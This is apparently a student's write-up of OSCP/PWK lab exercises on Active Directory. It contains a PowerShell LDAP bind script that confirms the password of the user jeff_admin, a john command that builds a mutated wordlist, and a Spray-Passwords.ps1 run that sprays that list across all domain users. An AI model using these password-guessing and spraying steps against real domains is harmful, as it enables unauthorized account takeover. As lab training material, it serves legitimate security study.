21.3.5.1

# 21.3.5.1.1. Use the PowerShell script in this module to guess the password of the jeff_admin user.

We already know the password is 'lab'. Let's use that in the following script:
```powershell
kali@kali:~/gitWorkspace/pwk/oscpExercises/21_activeDirectoryAttacks$ cat authenticateUsingDirectoryEntry.ps1 
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "lab")
kali@kali:~/gitWorkspace/pwk/oscpExercises/21_activeDirectoryAttacks$ 
```

The output is an indication that the password is correct.
![07f5c96952be8c2cde1f7635d9f2c04e.png](e6066891abf14cd0bd2022eee47da1b1.png)



# 21.3.5.1.2. Use the Spray-Passwords.ps1 tool to perform a lookup brute force attack of all users in the domain from a password list.

Create a custom wordlist
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/21_activeDirectoryAttacks$ sudo john --wordlist=pwds.txt --rules --stdout > mutated.txt                     
Using default input encoding: UTF-8      
Press 'q' or Ctrl-C to abort, almost any other key for status                     
202p 0:00:00:00 100.00% (2020-10-08 17:36) 2885p/s Qwerty99!  
```

Run Spray-Passwords.ps1 with the custom wordlist. We see it has guessed the passwords.
`PS C:\Tools\active_directory> .\Spray-Passwords.ps1 -Url 'http://192.168.119.214/mutated.txt' -Admin -Verbose`
![1917ee93dfe262b2034ed4c29916eb7c.png](a8256fb242b540629739e0f905b1bb4f.png)
![d21da523b9f1ed3262048fe2a20e464b.png](70962d5d296d4c5a9037e45f70d6a4b0.png)